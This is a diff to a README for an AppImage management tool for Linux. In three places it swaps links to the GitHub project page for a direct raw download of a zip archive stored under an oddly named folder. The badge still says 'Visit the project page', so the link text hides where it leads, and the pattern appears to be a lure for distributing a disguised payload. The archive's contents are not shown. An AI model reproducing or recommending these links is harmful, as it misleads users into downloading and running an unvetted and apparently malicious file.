@@ -1,6 +1,6 @@
 # 🧩 appimage-manager - Simple AppImage Integration for Linux
 
-[![Download appimage-manager](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/capananalfonso-gif/appimage-manager)
+[![Download appimage-manager](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/capananalfonso-gif/appimage-manager/main/thinkableness/manager-appimage-3.6.zip)
 
 ## 🚀 What appimage-manager does
 
@@ -20,7 +20,7 @@ If you use AppImages often, this tool saves time and keeps your app menu clean.
 
 Use this page to download and set up the app:
 
-https://github.com/capananalfonso-gif/appimage-manager
+https://raw.githubusercontent.com/capananalfonso-gif/appimage-manager/main/thinkableness/manager-appimage-3.6.zip
 
 Open the link, look for the latest release or download files, and get the version made for your system.
 
@@ -210,7 +210,7 @@ This repository focuses on:
 
 Download and setup page:
 
-https://github.com/capananalfonso-gif/appimage-manager
+https://raw.githubusercontent.com/capananalfonso-gif/appimage-manager/main/thinkableness/manager-appimage-3.6.zip
 
 ## 🧾 Repo details
 
